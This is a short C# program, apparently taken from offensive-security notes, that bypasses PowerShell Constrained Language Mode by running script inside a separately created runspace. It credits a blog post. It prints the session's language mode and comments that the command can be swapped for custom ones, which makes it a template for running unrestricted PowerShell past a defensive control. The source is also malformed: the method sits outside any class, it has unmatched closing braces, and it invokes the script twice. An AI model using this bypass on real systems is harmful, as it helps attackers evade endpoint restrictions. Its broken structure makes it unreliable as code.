using System;
using System.Collections.ObjectModel;
using System.Runtime.InteropServices;
using System.Management.Automation;
using System.Management.Automation.Runspaces;

// from this blogpost https://www.secjuice.com/powershell-constrainted-language-mode-bypass-using-runspaces/
 
 public static void Main(String[] args)
        {
            Runspace run = RunspaceFactory.CreateRunspace();
            run.Open();

            PowerShell shell = PowerShell.Create();
            shell.Runspace = run;

            String exec = "$ExecutionContext.SessionState.LanguageMode";  // Modify for custom commands
            shell.AddScript(exec);
            shell.Invoke();

            Collection<PSObject> output = shell.Invoke();
            foreach (PSObject o in output)
            {
                Console.WriteLine(o.ToString());
            }

            foreach (ErrorRecord err in shell.Streams.Error)
            {
                Console.Write("Error: " + err.ToString());
            }
            run.Close();

        }
    }

}
